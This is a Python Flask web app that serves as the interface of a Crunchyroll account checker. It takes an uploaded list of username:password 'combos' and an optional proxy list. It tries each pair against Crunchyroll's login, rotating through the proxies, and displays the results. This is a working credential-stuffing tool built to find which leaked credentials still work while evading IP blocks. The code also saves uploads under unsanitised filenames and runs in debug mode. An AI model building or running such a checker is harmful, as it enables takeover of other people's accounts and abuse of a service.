from flask import Flask, render_template, request
import os
from crunchroll_checker import crunchyroll_login, load_list_from_file

app = Flask(__name__, static_folder="static")
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/', methods=['GET', 'POST'])
def index():
    results = []
    if request.method == 'POST':
        combo_file = request.files['combo']
        proxy_file = request.files.get('proxies')

        combo_path = os.path.join(UPLOAD_FOLDER, combo_file.filename)
        combo_file.save(combo_path)
        combos = load_list_from_file(combo_path)

        proxies = []
        if proxy_file and proxy_file.filename:
            proxy_path = os.path.join(UPLOAD_FOLDER, proxy_file.filename)
            proxy_file.save(proxy_path)
            proxies = load_list_from_file(proxy_path)

        proxy_index = 0
        for combo in combos:
            if ':' not in combo:
                continue
            username, password = combo.split(':', 1)
            proxy = proxies[proxy_index % len(proxies)] if proxies else None
            proxy_index += 1
            result = crunchyroll_login(username, password, proxy=proxy)
            results.append({
                'combo': combo,
                'result': result
            })
        return render_template('index.html', results=results)
    return render_template('index.html', results=None)

if __name__ == '__main__':
    app.run(debug=True)
